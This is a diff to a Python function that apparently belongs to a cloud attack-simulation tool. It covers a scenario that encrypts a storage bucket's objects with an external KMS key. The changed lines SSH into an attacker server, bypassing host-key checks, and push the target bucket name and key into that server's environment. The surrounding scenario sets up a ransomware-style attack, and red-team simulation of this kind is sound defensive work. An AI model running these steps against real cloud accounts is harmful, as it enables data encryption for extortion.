@@ -58,8 +58,8 @@ def scenario_5_execute():
     print(colored("Access bucket & encrypt the objects using external kms key", color="red"))
     loading_animation()
     print("-"*30)
-    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'echo BUCKET_NAME={BUCKET_NAME}>>~/.bashrc && echo KMS_KEY={KMS_KEY}>>~/.bashrc'", shell=True)
-    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'source ~/.bashrc && echo $BUCKET_NAME'", shell=True)
+    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'echo BUCKET_NAME={BUCKET_NAME} | sudo tee -a /etc/environment && echo KMS_KEY={KMS_KEY} | sudo tee -a /etc/environment'", shell=True)
+    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'echo $BUCKET_NAME'", shell=True)
 
 
 
